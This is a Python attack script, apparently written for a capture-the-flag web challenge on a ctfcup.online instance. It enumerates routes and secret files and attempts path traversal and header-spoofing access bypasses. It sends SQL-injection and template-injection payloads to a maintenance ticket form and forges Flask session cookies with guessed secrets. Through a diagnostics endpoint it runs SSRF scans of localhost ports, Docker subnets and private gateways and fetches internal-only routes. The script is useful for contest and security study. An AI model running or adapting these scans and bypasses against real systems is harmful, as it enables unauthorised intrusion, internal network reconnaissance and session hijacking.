#!/usr/bin/env python3
import concurrent.futures
import http.cookiejar
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = "9taux6shw8cpbvs5.instances.ctfcup.online"
BASE = f"http://{HOST}"
OUT = "/tmp/web-out"
os.makedirs(OUT, exist_ok=True)
JSONL = os.path.join(OUT, "probe3.jsonl")
SUMMARY = os.path.join(OUT, "SUMMARY3.txt")
ctx = ssl._create_unverified_context()
UA = "Mozilla/5.0 (X11; Linux x86_64) targeted-probe"
FLAG_RE = re.compile(r"ctfcup\{[^}]+\}")

# Incremental output: if the job is killed, partial files still survive in
# /tmp/web-out for the save step.
jsonl_f = open(JSONL, "w", encoding="utf-8", buffering=1)
summary_f = open(SUMMARY, "w", encoding="utf-8", buffering=1)

def emit(rec):
    rec = dict(rec)
    if isinstance(rec.get("body"), (bytes, bytearray)):
        rec["body"] = bytes(rec["body"]).decode("utf-8", "replace")
    if isinstance(rec.get("body"), str) and len(rec["body"]) > 30000:
        rec["body"] = rec["body"][:30000]
        rec["truncated"] = True
    line = json.dumps(rec, ensure_ascii=False)
    jsonl_f.write(line + "\n")
    jsonl_f.flush()
    flags = FLAG_RE.findall(line)
    if flags:
        summary_f.write(f"\nFLAG FOUND {flags} in {line[:8000]}\n")
        summary_f.flush()
    return rec

def section(title):
    print(f"\n===== {title} =====", flush=True)
    summary_f.write(f"\n===== {title} =====\n")
    summary_f.flush()

def note(text):
    print(text, flush=True)
    summary_f.write(text + "\n")
    summary_f.flush()

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

plain_opener = urllib.request.build_opener(
    NoRedirect, urllib.request.HTTPSHandler(context=ctx)
)

def opener_with_cookies():
    jar = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        NoRedirect,
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx),
    )
    return op, jar

def fetch(opener, url, method="GET", data=None, headers=None, timeout=12):
    h = {"User-Agent": UA, "Accept": "*/*", "Accept-Language": "ru,en;q=0.8"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    started = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            body = r.read(2_000_000)
            return {
                "url": url, "method": method, "status": r.status,
                "headers": list(r.headers.items()), "body": body,
                "elapsed": round(time.time() - started, 3),
            }
    except urllib.error.HTTPError as e:
        try:
            body = e.read(2_000_000)
        except Exception:
            body = b""
        return {
            "url": url, "method": method, "status": e.code,
            "headers": list(e.headers.items()) if e.headers else [], "body": body,
            "elapsed": round(time.time() - started, 3),
        }
    except Exception as e:
        return {
            "url": url, "method": method, "status": None,
            "error": f"{type(e).__name__}: {e}", "body": b"",
            "elapsed": round(time.time() - started, 3),
        }

def set_cookies(rec):
    return [v for k, v in rec.get("headers", []) if k.lower() == "set-cookie"]

def location(rec):
    for k, v in rec.get("headers", []):
        if k.lower() == "location":
            return v
    return ""

def body_text(rec):
    b = rec.get("body", b"")
    if isinstance(b, str):
        return b
    return b.decode("utf-8", "replace")

def is_standard_404(rec):
    txt = body_text(rec)
    return rec.get("status") == 404 and "The requested URL was not found" in txt

def is_unlocked(txt):
    return (
        "locked · maintenance authorization required" not in txt
        and ("Maintenance console" in txt or "Femtocell Management" in txt)
        and ("textarea" in txt or "console" in txt.lower() or "unlocked" in txt.lower())
    )

def run_map(jobs, fn, workers=14, label="jobs", interesting=None):
    results = []
    started = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(fn, job): job for job in jobs}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            try:
                rec = fut.result()
            except Exception as e:
                rec = {"job": str(futs[fut]), "kind": "worker-error", "error": repr(e)}
            rec["phase"] = label
            emit(rec)
            results.append(rec)
            if interesting and interesting(rec):
                note("HIT " + json.dumps(rec, ensure_ascii=False, default=str)[:7000])
            if done % 100 == 0 or done == len(jobs):
                print(f"[{label}] {done}/{len(jobs)} elapsed={time.time()-started:.1f}s", flush=True)
    return results

# ---------------- SSRF helper ----------------

def call_ssrf(target, timeout=10):
    q = urllib.parse.urlencode({"target": target})
    url = f"{BASE}/api/diagnostics/connectivity-test?{q}"
    rec = fetch(plain_opener, url, timeout=timeout, headers={"Accept": "application/json"})
    out = {"target": target, "outer_status": rec.get("status"), "elapsed": rec.get("elapsed")}
    if rec.get("error"):
        out.update(kind="outer-error", error=rec["error"])
        return out
    raw = body_text(rec)
    try:
        data = json.loads(raw)
    except Exception:
        out.update(kind="outer-nonjson", body=raw)
        return out
    if "body" in data or isinstance(data.get("status"), int):
        kind = "http"
    else:
        err = str(data.get("error", ""))
        if "Connection refused" in err:
            kind = "refused"
        elif "name resolution" in err or "Name or service not known" in err:
            kind = "dns"
        elif "timed out" in err:
            kind = "timeout"
        elif "No route to host" in err:
            kind = "noroute"
        elif "Connection reset" in err or "Remote end closed" in err or "EOF" in err:
            kind = "reset"
        else:
            kind = "error"
    out.update(kind=kind, **data)
    return out

def ssrf_hp(host, port, path="/", scheme="http"):
    return call_ssrf(f"{scheme}://mme-monitor@{host}:{port}{path}")

def ssrf_interesting(rec):
    return rec.get("kind") not in {"refused", "dns", "noroute"}

# ---------------- Phase 1: direct routes ----------------
section("DIRECT SANITY")
for path in ["/", "/maintenance", "/health", "/robots.txt", "/static/dashboard.js"]:
    rec = fetch(plain_opener, BASE + path)
    rec["phase"] = "direct-sanity"
    emit(rec)
    note(f"{path} -> {rec.get('status')} bytes={len(body_text(rec))} cookies={set_cookies(rec)}")

section("DIRECT ROUTE SCAN")
roots = [
    "api", "internal", "maintenance", "support", "field-support", "dispatch",
    "mme", "s1", "s1ap", "NAS", "session", "sessions", "echo", "diagnostics",
    "diag", "tickets", "ticket", "console", "terminal", "service", "management",
    "core", "subscriber", "device", "femtocell", "radio", "admin", "private",
    "service-request", "attach", "identity", "guti", "legacy", "old-session",
]
subs = [
    "", "/", "/health", "/status", "/info", "/version", "/config", "/ticket",
    "/tickets", "/active", "/current", "/latest", "/issue", "/verify", "/validate",
    "/auth", "/login", "/unlock", "/session", "/sessions", "/echo", "/send",
    "/message", "/messages", "/request", "/attach", "/service-request", "/identity",
    "/guti", "/imsi", "/subscriber", "/subscribers", "/connectivity-test",
]
paths = {f"/{r}{s}" for r in roots for s in subs}
paths.update({
    "/.git/HEAD", "/.git/config", "/.env", "/.env.local", "/config.json",
    "/settings.json", "/openapi.json", "/swagger.json", "/api/openapi.json",
    "/docs", "/redoc", "/debug", "/console", "/metrics", "/flag", "/flag.txt",
    "/robots.txt", "/sitemap.xml", "/favicon.ico", "/health", "/healthz", "/ready",
    "/api/diagnostics", "/api/diagnostics/", "/api/diagnostics/connectivity-test",
    "/api/connectivity-test", "/api/maintenance", "/api/maintenance/ticket",
    "/api/tickets/active", "/api/tickets/current", "/internal/tickets/active",
    "/internal/maintenance/ticket", "/maintenance/console", "/maintenance/unlock",
})

def route_job(path):
    rec = fetch(plain_opener, BASE + path, timeout=10)
    rec["path"] = path
    return rec

def route_interesting(rec):
    if rec.get("status") is None:
        return True
    if is_standard_404(rec):
        return False
    # Known public routes are recorded in sanity; still show non-404/new ones.
    return rec.get("status") != 404 or len(body_text(rec)) != 207

run_map(sorted(paths), route_job, workers=16, label="direct-routes", interesting=route_interesting)

# Static/source leak tries.
section("STATIC / SOURCE LEAK TRIES")
files = [
    "app.py", "main.py", "server.py", "run.py", "wsgi.py", "femtocell.py",
    "panel.py", "web.py", "config.py", "settings.py", "requirements.txt",
    "templates/index.html", "templates/dashboard.html", "templates/maintenance.html",
    "templates/maintenance_login.html", "static/dashboard.js.map", "../.env",
    "../../.env", "../Dockerfile", "../docker-compose.yml", "../compose.yml",
    "../flag.txt", "../flag", "../README.md", "../app/app.py", "../src/app.py",
]
static_paths = set()
for f in files:
    static_paths.add("/static/" + f)
    static_paths.add("/static/../" + f)
    static_paths.add("/static/%2e%2e/" + f)
    static_paths.add("/static/%2e%2e%2f" + f)
    static_paths.add("/static/..%2f" + f)
    static_paths.add("/static/%252e%252e%252f" + f)

def static_interesting(rec):
    txt = body_text(rec)
    return (rec.get("status") not in {404, 400} or "ctfcup{" in txt or "SECRET" in txt or "ticket" in txt.lower()) and not is_standard_404(rec)

run_map(sorted(static_paths), route_job, workers=16, label="static-leaks", interesting=static_interesting)

# Header / method bypass checks.
section("HEADER AND METHOD BYPASS CHECKS")
header_sets = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
    {"X-Internal": "true"},
    {"X-Maintenance": "true"},
    {"X-Field-Support": "dispatch"},
    {"X-Original-URL": "/internal/"},
    {"X-Rewrite-URL": "/internal/"},
    {"X-Ticket": "active"},
    {"Authorization": "Bearer active"},
]
for hs in header_sets:
    for path in ["/", "/maintenance"]:
        rec = fetch(plain_opener, BASE + path, headers=hs)
        rec.update(phase="header-bypass", test_headers=hs, path=path)
        emit(rec)
        txt = body_text(rec)
        if is_unlocked(txt) or rec.get("status") not in {200, 404}:
            note("HEADER HIT " + json.dumps(rec, ensure_ascii=False, default=str)[:7000])

for method in ["OPTIONS", "PUT", "PATCH", "DELETE"]:
    rec = fetch(plain_opener, BASE + "/maintenance", method=method, data=b"")
    rec.update(phase="method-check", path="/maintenance")
    emit(rec)
    note(f"{method} /maintenance -> {rec.get('status')} body={body_text(rec)[:300]!r}")

# ---------------- Phase 2: ticket form ----------------
section("MAINTENANCE TICKET TESTS")

def ticket_attempt(label, method="POST", data=None, headers=None, path="/maintenance"):
    op, jar = opener_with_cookies()
    rec = fetch(op, BASE + path, method=method, data=data, headers=headers, timeout=12)
    rec.update(phase="ticket-test", label=label, path=path, jar=[f"{c.name}={c.value}" for c in jar])
    emit(rec)
    txt = body_text(rec)
    # Follow a redirect or inspect the dashboard with any cookie obtained.
    follow = None
    if rec.get("status") in {301, 302, 303, 307, 308} or set_cookies(rec):
        dest = location(rec) or "/"
        follow = fetch(op, urllib.parse.urljoin(BASE + "/", dest), timeout=12)
        follow.update(phase="ticket-follow", label=label)
        emit(follow)
    success = False
    if follow and is_unlocked(body_text(follow)):
        success = True
    snippet = re.sub(r"\s+", " ", txt)[:600]
    note(
        f"TICKET {label!r} -> status={rec.get('status')} loc={location(rec)!r} "
        f"cookies={set_cookies(rec)} success={success} body={snippet!r}"
    )
    return success

candidates = [
    "", "test", "admin", "maintenance", "active", "ticket", "dispatch",
    "field-support", "field-support-dispatch", "support", "FEMTO-042",
    "femto-042", "FEMTO042", "042", "3.8.12", "firmware-3.8.12",
    "FEMTO-042-3.8.12", "ctfcup", "flag", "open", "unlock", "service",
    "' OR '1'='1", "' OR 1=1--", "' OR '1'='1'--", "') OR ('1'='1",
    "' OR 1=1#", "' OR 'x'='x", "admin'--", '" OR "1"="1',
    "{{7*7}}", "${7*7}", "%00", " active", "active ", "ACTIVE",
    "FEMTO-042\n", "FEMTO-042\r\n", "null", "None", "true", "[]", "{}",
]
for cand in candidates:
    data = urllib.parse.urlencode({"ticket": cand}).encode()
    if ticket_attempt(cand, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}):
        note("TICKET SUCCESS; continuing other phases with candidate recorded above")
        break

# Alternative encodings / parameter pollution for a small core set.
for cand in ["active", "FEMTO-042", "' OR '1'='1", "test"]:
    ticket_attempt(
        f"json:{cand}",
        data=json.dumps({"ticket": cand}).encode(),
        headers={"Content-Type": "application/json"},
    )
    ticket_attempt(
        f"json-list:{cand}",
        data=json.dumps({"ticket": [cand]}).encode(),
        headers={"Content-Type": "application/json"},
    )
    ticket_attempt(
        f"dup:{cand}",
        data=f"ticket=wrong&ticket={urllib.parse.quote(cand)}".encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    ticket_attempt(f"get:{cand}", method="GET", path="/maintenance?" + urllib.parse.urlencode({"ticket": cand}))

# Flask session-cookie forging with common development secrets, if Flask is
# installed in the workflow step. Harmless if the real secret is random.
section("FLASK SESSION COMMON-SECRET TESTS")
try:
    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface

    secrets = [
        "secret", "dev", "development", "changeme", "change-me", "supersecret",
        "super-secret", "secret-key", "secret_key", "flask-secret", "femtocell",
        "femto", "FEMTO-042", "femto-042", "maintenance", "dispatch",
        "field-support", "ctfcup", "ctf", "password", "femtocell-secret",
        "femtocell-web", "femto-secret", "support", "ticket", "3.8.12",
        "femto042", "hard to guess string", "you-will-never-guess",
    ]
    payloads = [
        {
            "maintenance": True, "maintenance_unlocked": True, "unlocked": True,
            "authenticated": True, "authorized": True, "ticket_valid": True,
            "support": True, "field_support": True, "maintenance_authorized": True,
        },
        {
            "ticket": "FEMTO-042", "maintenance_ticket": "FEMTO-042",
            "maintenance": True, "authenticated": True, "unlocked": True,
        },
        {"maintenance_unlocked": True},
        {"unlocked": True},
        {"authenticated": True, "role": "maintenance", "user": "field-support"},
        {"ticket": "active", "maintenance_ticket": "active", "authenticated": True},
    ]
    dummy = Flask(__name__)
    iface = SecureCookieSessionInterface()
    found_session = False
    for secret in secrets:
        if found_session:
            break
        dummy.secret_key = secret
        ser = iface.get_signing_serializer(dummy)
        if ser is None:
            continue
        for pi, payload in enumerate(payloads):
            cookie = ser.dumps(payload)
            rec = fetch(plain_opener, BASE + "/", headers={"Cookie": f"session={cookie}"})
            rec.update(phase="session-forge", secret=secret, payload_index=pi, payload=payload, cookie=cookie)
            emit(rec)
            txt = body_text(rec)
            if is_unlocked(txt) or len(txt) != 2366:
                note(f"SESSION HIT secret={secret!r} payload={pi} len={len(txt)} status={rec.get('status')} cookies={set_cookies(rec)}")
                note(txt[:5000])
                if is_unlocked(txt):
                    found_session = True
                    break
except Exception as e:
    note(f"session-forge unavailable: {type(e).__name__}: {e}")

# ---------------- Phase 3: focused SSRF ports ----------------
section("SSRF SANITY")
for target in [
    "http://mme-monitor:8081/health",
    "http://mme-monitor@127.0.0.1:8080/health",
    "http://mme-monitor@172.18.0.2:8080/health",
    "http://mme-monitor@172.18.0.1:8080/health",
    "http://mme-monitor@172.17.0.1:8080/health",
]:
    rec = call_ssrf(target)
    rec["phase"] = "ssrf-sanity"
    emit(rec)
    note(json.dumps(rec, ensure_ascii=False)[:4000])

section("SSRF LOCALHOST FOCUSED PORTS")
ports = set()
ports.update([
    21,22,23,25,53,67,69,80,81,88,110,111,123,135,139,143,161,179,389,427,
    443,445,465,500,514,515,587,623,631,873,993,995,1025,1080,1194,1433,
    1521,1723,1883,2049,2123,2181,2222,2375,2376,3128,3306,3389,3868,4369,
    5044,5060,5432,5672,5900,6379,6443,7070,7500,8025,8060,8070,8333,8443,
    8500,8888,9042,9100,9200,9300,10000,10250,11211,15672,27017,36412,61616,
])
for a, b in [(3000, 3010), (4000, 4100), (5000, 5100), (6000, 6100), (7000, 7100),
             (8000, 8200), (9000, 9200), (10000, 10100), (18080, 18090)]:
    ports.update(range(a, b + 1))
ports = sorted(ports)

def local_port_job(port):
    return ssrf_hp("127.0.0.1", port, "/")

run_map(ports, local_port_job, workers=18, label="ssrf-localhost-ports", interesting=ssrf_interesting)

section("SSRF GATEWAY/INTERFACE TOP PORTS")
top_ports = sorted(set([
    22,53,80,443,2123,2375,2376,3000,3868,5000,5060,5432,5672,6379,8000,
    8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8443,8888,9000,
    9001,9002,9090,9200,10000,15672,27017,36412,
] + list(range(8070, 8131)) + list(range(8990, 9071))))
interface_hosts = ["172.18.0.1", "172.17.0.1", "172.18.0.2"]
jobs = [(h, p) for h in interface_hosts for p in top_ports]

def interface_job(hp):
    return ssrf_hp(hp[0], hp[1], "/")

run_map(jobs, interface_job, workers=18, label="ssrf-interface-ports", interesting=ssrf_interesting)

# Host discovery for the first part of observed bridge subnets plus typical
# static allocations. Refused means live; timeout is likely absent/filtered.
section("SSRF HOST DISCOVERY 172.17/172.18 (first/static addresses)")
host_numbers = list(range(1, 65)) + [100, 101, 110, 120, 127, 128, 150, 200, 254]
hosts = [f"172.18.0.{i}" for i in host_numbers] + [f"172.17.0.{i}" for i in host_numbers]
discovery_jobs = [(h, p) for h in hosts for p in [8080, 8081, 80, 9000]]

def discovery_interesting(rec):
    # Include refused here because it proves a live address in this phase.
    return rec.get("kind") in {"http", "refused", "reset"}

disc = run_map(discovery_jobs, interface_job, workers=24, label="ssrf-host-discovery", interesting=discovery_interesting)
live = sorted({urllib.parse.urlparse(r.get("target", "")).hostname for r in disc if discovery_interesting(r)})
note("LIVE HOSTS: " + ", ".join(x for x in live if x))

# For any newly live hosts, run the top-port scan (excluding already scanned).
extra_live = [h for h in live if h not in set(interface_hosts + ["127.0.0.1"])][:20]
if extra_live:
    section("SSRF EXTRA LIVE HOST TOP PORTS")
    extra_jobs = [(h, p) for h in extra_live for p in top_ports]
    run_map(extra_jobs, interface_job, workers=20, label="ssrf-extra-host-ports", interesting=ssrf_interesting)

# Gateway addresses of other plausible Docker/private subnets. Only .1 and
# two ports to bound timeouts; a hit reveals another local interface.
section("SSRF OTHER SUBNET GATEWAYS")
gateways = [f"172.{i}.0.1" for i in range(16, 32)] + [
    "192.168.0.1", "192.168.1.1", "192.168.10.1", "192.168.42.1", "192.168.100.1",
    "10.0.0.1", "10.0.1.1", "10.10.10.1", "10.42.0.1", "10.42.42.1",
    "10.100.0.1", "10.200.0.1", "100.64.0.1", "169.254.1.1",
]
gw_jobs = [(h, p) for h in gateways for p in [8080, 8081]]
run_map(gw_jobs, interface_job, workers=24, label="ssrf-gateways", interesting=discovery_interesting)

# Local-only route inspection through SSRF to the app itself.
section("SSRF SELF LOCAL-ONLY ROUTES")
self_paths = sorted({p for p in paths if p.startswith(("/internal", "/api/internal"))} | {
    "/", "/maintenance", "/health", "/robots.txt", "/static/dashboard.js",
    "/internal/", "/internal/flag", "/internal/config", "/internal/env",
    "/internal/tickets/active", "/internal/tickets/current", "/api/internal/tickets",
})

def self_job(path):
    return ssrf_hp("127.0.0.1", 8080, path)

def self_interesting(rec):
    if rec.get("kind") != "http":
        return ssrf_interesting(rec)
    body = rec.get("body", "") or ""
    if rec.get("status") == 404 and "The requested URL was not found" in body:
        return False
    return True

run_map(self_paths, self_job, workers=16, label="ssrf-self-routes", interesting=self_interesting)

section("DONE")
note("probe3 complete")
jsonl_f.close()
summary_f.close()
